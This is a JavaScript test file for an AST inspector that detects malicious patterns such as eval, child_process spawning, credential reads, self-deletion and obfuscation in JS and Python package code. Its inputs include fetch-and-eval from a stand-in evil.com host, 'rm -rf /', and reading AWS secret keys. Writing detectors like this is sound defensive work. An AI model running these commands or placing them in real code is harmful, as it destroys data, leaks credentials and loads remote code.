import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { inspectJS, inspectPython } from '../src/analysis/ast-inspector.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const fixtures = join(__dirname, 'fixtures');

// ── Malicious pattern detection ──────────────────────────────────────

describe('AST Inspector — malicious patterns', () => {
  it('detects direct eval()', () => {
    const r = inspectJS('eval("alert(1)");');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
    assert.ok(r.capabilities.executesCode);
  });

  it('detects new Function() constructor', () => {
    const r = inspectJS('const fn = new Function("return 1");');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
  });

  it('detects eval passed as callback (.then(eval))', () => {
    const r = inspectJS('fetch("url").then(r => r.text()).then(eval);');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
    assert.ok(r.findings.some(f => f.pattern === 'NETWORK_ACCESS'));
  });

  it('detects child_process.exec (direct assignment)', () => {
    const r = inspectJS('const cp = require("child_process"); cp.exec("cmd");');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
    assert.ok(r.capabilities.spawnsProcess);
  });

  it('detects destructured require — const { exec } = require("child_process")', () => {
    const r = inspectJS('const { exec } = require("child_process"); exec("cmd");');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'),
      'destructured exec() must be detected as PROCESS_SPAWN');
  });

  it('detects destructured execSync', () => {
    const r = inspectJS('const { execSync } = require("child_process"); execSync("cmd");');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
  });

  it('detects require("child_process").exec() inline', () => {
    const r = inspectJS('require("child_process").exec("cmd");');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
  });

  it('detects node:child_process variant', () => {
    const r = inspectJS('const { spawn } = require("node:child_process"); spawn("cmd");');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
  });

  it('detects Buffer.from base64 decode', () => {
    const r = inspectJS('Buffer.from("aGVsbG8=", "base64");');
    assert.ok(r.findings.some(f => f.pattern === 'BASE64_DECODE'));
    assert.ok(r.capabilities.decodesPayloads);
  });

  it('detects process.env credential harvesting', () => {
    const r = inspectJS('const key = process.env.AWS_SECRET_ACCESS_KEY;');
    assert.ok(r.findings.some(f => f.pattern === 'ENV_HARVESTING'));
    assert.ok(r.capabilities.readsCredentials);
  });

  it('detects self-deletion (fs.unlinkSync(__filename))', () => {
    const r = inspectJS('const fs = require("fs"); fs.unlinkSync(__filename);');
    assert.ok(r.findings.some(f => f.pattern === 'SELF_DELETION'));
    assert.ok(r.capabilities.selfDeletes);
  });

  it('detects fetch() network access', () => {
    const r = inspectJS('fetch("https://evil.com/payload");');
    assert.ok(r.findings.some(f => f.pattern === 'NETWORK_ACCESS'));
    assert.ok(r.capabilities.accessesNetwork);
  });

  it('detects http.request() network access', () => {
    const r = inspectJS('const https = require("https"); https.request("https://evil.com");');
    assert.ok(r.findings.some(f => f.pattern === 'NETWORK_ACCESS'));
  });

  it('detects fs.writeFile to system path', () => {
    const r = inspectJS('const fs = require("fs"); fs.writeFileSync("/tmp/backdoor", "payload");');
    assert.ok(r.findings.some(f => f.pattern === 'SYSTEM_PATH_WRITE'));
    assert.ok(r.capabilities.writesSystemPaths);
  });

  it('detects dynamic require with variable argument', () => {
    const r = inspectJS('const mod = someVar; require(mod);');
    assert.ok(r.findings.some(f => f.pattern === 'DYNAMIC_REQUIRE'));
    assert.ok(r.capabilities.dynamicLoading);
  });

  it('detects dynamic import() with non-literal', () => {
    const r = inspectJS('const mod = "child_process"; import(mod);');
    assert.ok(r.findings.some(f => f.pattern === 'DYNAMIC_IMPORT'));
  });

  it('detects process.binding escape hatch', () => {
    const r = inspectJS('process.binding("spawn_sync");');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
  });

  it('detects process.dlopen', () => {
    const r = inspectJS('process.dlopen(module, "./native.node");');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
  });

  it('detects vm.runInNewContext (method call)', () => {
    const r = inspectJS('const vm = require("vm"); vm.runInNewContext("code");');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
  });

  it('detects destructured vm methods', () => {
    const r = inspectJS('const { runInNewContext } = require("vm"); runInNewContext("code");');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
  });

  it('detects string concatenation evasion in require()', () => {
    const r = inspectJS('require("child" + "_process");');
    assert.ok(r.findings.some(f => f.pattern === 'POSSIBLE_OBFUSCATION'));
  });

  it('flags unparseable code as suspicious', () => {
    const r = inspectJS('this is not {{ valid JS at all }}}}}');
    assert.ok(r.findings.some(f => f.pattern === 'UNPARSEABLE_CODE'));
  });
});

// ── False positive resistance ────────────────────────────────────────

describe('AST Inspector — no false positives', () => {
  it('clean code produces zero findings', () => {
    const r = inspectJS('const x = 1 + 2; console.log(x);');
    assert.equal(r.findingCount, 0);
  });

  it('fs.readFileSync is not flagged', () => {
    const r = inspectJS('const fs = require("fs"); fs.readFileSync("config.json", "utf8");');
    assert.equal(r.findingCount, 0);
  });

  it('path.join is not flagged', () => {
    const r = inspectJS('const path = require("path"); path.join(__dirname, "lib");');
    assert.equal(r.findingCount, 0);
  });

  it('console.log is not flagged', () => {
    const r = inspectJS('console.log("hello"); console.warn("test");');
    assert.equal(r.findingCount, 0);
  });

  it('JSON.parse is not flagged', () => {
    const r = inspectJS('const data = JSON.parse("{}");');
    assert.equal(r.findingCount, 0);
  });

  it('static require with string literal is not flagged', () => {
    const r = inspectJS('const express = require("express");');
    assert.equal(r.findingCount, 0);
  });

  it('clean fixture file produces zero findings', () => {
    const source = readFileSync(join(fixtures, 'clean-postinstall.fixture'), 'utf8');
    const r = inspectJS(source, 'clean-postinstall.fixture');
    assert.equal(r.findingCount, 0, `Expected 0 findings but got: ${r.findings.map(f => f.pattern).join(', ')}`);
  });

  it('malicious fixture file detects all patterns', () => {
    const source = readFileSync(join(fixtures, 'malicious-postinstall.fixture'), 'utf8');
    const r = inspectJS(source, 'malicious-postinstall.fixture');
    assert.ok(r.findingCount >= 10, `Expected 10+ findings but got ${r.findingCount}`);
    assert.ok(r.capabilities.executesCode);
    assert.ok(r.capabilities.spawnsProcess);
    assert.ok(r.capabilities.accessesNetwork);
    assert.ok(r.capabilities.selfDeletes);
    assert.ok(r.capabilities.readsCredentials);
    assert.ok(r.capabilities.decodesPayloads);
  });
});

// ── Python inspector ─────────────────────────────────────────────────

describe('Python Inspector', () => {
  it('detects subprocess.Popen', () => {
    const r = inspectPython('subprocess.Popen("cmd", shell=True)');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
  });

  it('detects os.system', () => {
    const r = inspectPython('os.system("rm -rf /")');
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'));
  });

  it('detects eval/exec builtins', () => {
    const r = inspectPython('eval(payload)');
    assert.ok(r.findings.some(f => f.pattern === 'CODE_EXECUTION'));
  });

  it('detects base64 decode', () => {
    const r = inspectPython('base64.b64decode(encoded)');
    assert.ok(r.findings.some(f => f.pattern === 'BASE64_DECODE'));
  });

  it('detects network access', () => {
    const r = inspectPython('requests.get("http://evil.com")');
    assert.ok(r.findings.some(f => f.pattern === 'NETWORK_ACCESS'));
  });

  it('handles line continuations (evasion technique)', () => {
    const src = 'subprocess' + String.fromCharCode(92) + '\n  .Popen("cmd", shell=True)';
    const r = inspectPython(src);
    assert.ok(r.findings.some(f => f.pattern === 'PROCESS_SPAWN'),
      'line continuation must not evade detection');
  });

  it('skips comments', () => {
    const r = inspectPython('# subprocess.Popen("not real")');
    assert.equal(r.findingCount, 0);
  });

  it('clean Python produces zero findings', () => {
    const r = inspectPython('import json\ndata = json.loads("{}")\nprint(data)');
    assert.equal(r.findingCount, 0);
  });
});
